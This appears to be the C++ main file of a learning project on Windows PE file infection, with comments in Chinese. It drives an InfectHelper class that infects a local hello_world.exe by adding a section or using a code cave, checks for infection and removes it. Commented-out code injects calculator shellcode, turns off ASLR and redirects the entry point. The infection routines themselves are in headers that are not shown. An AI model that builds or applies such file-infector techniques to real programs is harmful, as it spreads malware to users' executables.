#include <iostream>
#include <vector>
#include <string>
#include <tuple>
#include <Windows.h>
#include "pe.hpp"
#include "virus.hpp"


using namespace std;


int main() {
	cout << hex;
	string pe_file("C:/Users/qiufeng/Desktop/hello_world.exe");
	PEHelper pe_info;
	pe_info.LoadPE(pe_file);
	pe_info.DisplayPEInfo();
	//pe_info.LoadPE("C:/Users/qiufeng/Desktop/user32.dll");
	//pe_info.LoadPE("C:/Users/qiufeng/Desktop/user64.dll");
	//cout << pe_info.GetImageBase() << endl;
	//cout << pe_info.RVAToFOA(0x12314) << endl;

	//vector<string> names = pe_info.GetSectionNames();
	//cout << "节名：" << endl;
	//for (auto it = names.begin(); it != names.end(); it++) {
	//	cout << (*it) << endl;
	//}

	//vector<IMAGE_IMPORT_DESCRIPTOR> import_descriptor = pe_info.GetImageImportDescriptors();
	//vector<IMAGE_THUNK_DATA32> thunk_data32 = pe_info.GetImageThunkData32(import_descriptor[0]);
	//vector<string> dll_names = pe_info.GetImportDLLNames();
	//cout << "引入的dll名：" << endl;
	//for (auto it = dll_names.begin(); it != dll_names.end(); it++) {
	//	cout << (*it) << endl;
	//}

	//vector<tuple<WORD, string>> function_names = pe_info.GetImportFunctionNames(import_descriptor[1]);
	//IMAGE_EXPORT_DIRECTORY edt = pe_info.GetExportDirectory();
	//DWORD message_rva = pe_info.GetExportFunctionRVA("MessageBoxA");

	//cout << "是否开启 ALSR: " << pe_info.HasASLR() << endl;
	//pe_info.CloseASLR();
	//cout << "是否开启 ALSR: " << pe_info.HasASLR() << endl;
	//pe_info.OpenASLR();
	//cout << "是否开启 ALSR: " << pe_info.HasASLR() << endl;

	//pe_info.DisplayPEInfo();
	//cout << "新节起始FOA: " << pe_info.GetNewSectionFOA() << endl;
	//cout << "新节起始位置RVA: " << pe_info.GetNewSectionRVA() << endl;
	//string buffer = GetCalcuatorShellcode32(pe_info.GetEntryPointRVA() + pe_info.GetImageBase());
	//// 需要跳过旧 eip
	//pe_info.SetEntryPoint(pe_info.GetNewSectionRVA() + 4);
	//const CHAR* tmp_name = ".qiufeng";
	//BYTE name[8];
	//for (int i = 0; i != IMAGE_SIZEOF_SHORT_NAME; i++) {
	//	name[i] = static_cast<BYTE>(tmp_name[i]);
	//}
	//pe_info.AddNewSection(buffer, name);
	//pe_info.SetEntryPoint(0x10);
	//pe_info.SetEntryPoint(0x1000);

	InfectHelper vh(pe_file);
	InfectPadding pad = vh.LoadInfectPadding();

	cout << vh.IsInfected();
	cout << vh.InfectByAddSection();
	cout << vh.InfectByCodeCave();
	cout << vh.IsInfected();
	cout << vh.RemoveVirus();
	cout << vh.InfectByCodeCave();
	cout << vh.InfectByAddSection();
	cout << vh.RemoveVirus();
	cout << vh.IsInfected();
	cout << vh.IsInfected();
	cout << vh.InfectByAddSection();
	cout << vh.InfectByCodeCave();
	cout << vh.RemoveVirus();
	return 0;
}